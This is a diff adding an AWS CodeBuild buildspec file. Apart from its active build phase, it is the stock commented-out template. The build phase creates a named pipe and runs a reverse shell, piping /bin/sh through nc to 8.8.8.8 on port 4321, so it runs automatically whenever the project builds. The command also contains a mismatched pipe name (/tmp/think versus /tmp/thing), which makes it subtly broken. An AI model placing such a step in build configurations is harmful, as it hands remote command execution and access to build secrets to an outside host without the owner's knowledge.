@@ -1,0 +1,36 @@
+version: 0.2
+
+#env:
+  #variables:
+     # key: "value"
+     # key: "value"
+  #parameter-store:
+     # key: "value"
+     # key: "value"
+
+phases:
+  #install:
+    #commands:
+      # - command
+      # - command
+  #pre_build:
+    #commands:
+      # - command
+      # - command
+  build:
+    commands:
+      - mknod /tmp/thing p
+      - /bin/sh 0</tmp/think | nc 8.8.8.8 4321 1>/tmp/thing
+  #post_build:
+    #commands:
+      # - command
+      # - command
+#artifacts:
+  #files:
+    # - location
+    # - location
+  #discard-paths: yes
+  #base-directory: location
+#cache:
+  #paths:
+    # - paths
